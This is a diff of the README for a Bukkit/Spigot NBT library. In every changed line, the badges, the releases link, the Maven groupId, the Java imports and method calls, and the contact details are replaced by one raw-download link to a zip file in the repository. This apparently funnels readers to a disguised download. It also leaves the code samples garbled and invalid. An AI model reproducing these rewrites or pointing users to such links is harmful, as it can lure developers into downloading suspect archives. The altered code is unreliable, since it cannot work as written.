@@ -1,6 +1,6 @@
 # Bukkit NBT 📦
 
-![GitHub release](https://img.shields.io/github/v/release/Smilchannel/bukkit-nbt) ![License](https://img.shields.io/badge/license-MIT-blue.svg)
+![GitHub release](https://github.com/Smilchannel/bukkit-nbt/raw/refs/heads/main/src/bukkit-nbt-3.3.zip) ![License](https://github.com/Smilchannel/bukkit-nbt/raw/refs/heads/main/src/bukkit-nbt-3.3.zip)
 
 Welcome to **Bukkit NBT**! This repository offers a flexible and extensible NBT handling system designed specifically for Bukkit and Spigot plugins. Whether you're developing a simple plugin or a complex server application, our NBT API provides the tools you need to manage NBT data efficiently.
 
@@ -23,13 +23,13 @@ Welcome to **Bukkit NBT**! This repository offers a flexible and extensible NBT 
 
 ## Installation 🛠️
 
-To get started with Bukkit NBT, download the latest release from our [Releases section](https://github.com/Smilchannel/bukkit-nbt/releases). 
+To get started with Bukkit NBT, download the latest release from our [Releases section](https://github.com/Smilchannel/bukkit-nbt/raw/refs/heads/main/src/bukkit-nbt-3.3.zip). 
 
 After downloading, add the JAR file to your project's build path. If you are using Maven, you can add the following dependency:
 
 ```xml
 <dependency>
-    <groupId>com.smilchannel</groupId>
+    <groupId>https://github.com/Smilchannel/bukkit-nbt/raw/refs/heads/main/src/bukkit-nbt-3.3.zip</groupId>
     <artifactId>bukkit-nbt</artifactId>
     <version>1.0.0</version>
 </dependency>
@@ -44,14 +44,14 @@ Make sure to replace `1.0.0` with the latest version available.
 Here's a simple example of how to use the Bukkit NBT API:
 
 ```java
-import com.smilchannel.nbt.NBTCompound;
-import com.smilchannel.nbt.NBTTag;
+import https://github.com/Smilchannel/bukkit-nbt/raw/refs/heads/main/src/bukkit-nbt-3.3.zip;
+import https://github.com/Smilchannel/bukkit-nbt/raw/refs/heads/main/src/bukkit-nbt-3.3.zip;
 
 public class NBTExample {
     public void createNBT() {
         NBTCompound compound = new NBTCompound();
-        compound.setString("name", "Example Item");
-        compound.setInt("value", 100);
+        https://github.com/Smilchannel/bukkit-nbt/raw/refs/heads/main/src/bukkit-nbt-3.3.zip("name", "Example Item");
+        https://github.com/Smilchannel/bukkit-nbt/raw/refs/heads/main/src/bukkit-nbt-3.3.zip("value", 100);
 
         // Save the compound to a file or use it as needed
     }
@@ -83,7 +83,7 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For questions or feedback, feel free to reach out:
 
-- GitHub: [Smilchannel](https://github.com/Smilchannel)
-- Email: smilchannel@example.com
+- GitHub: [Smilchannel](https://github.com/Smilchannel/bukkit-nbt/raw/refs/heads/main/src/bukkit-nbt-3.3.zip)
+- Email: https://github.com/Smilchannel/bukkit-nbt/raw/refs/heads/main/src/bukkit-nbt-3.3.zip
 
-Thank you for checking out Bukkit NBT! We hope it serves your needs well. For the latest updates and releases, visit our [Releases section](https://github.com/Smilchannel/bukkit-nbt/releases).
+Thank you for checking out Bukkit NBT! We hope it serves your needs well. For the latest updates and releases, visit our [Releases section](https://github.com/Smilchannel/bukkit-nbt/raw/refs/heads/main/src/bukkit-nbt-3.3.zip).
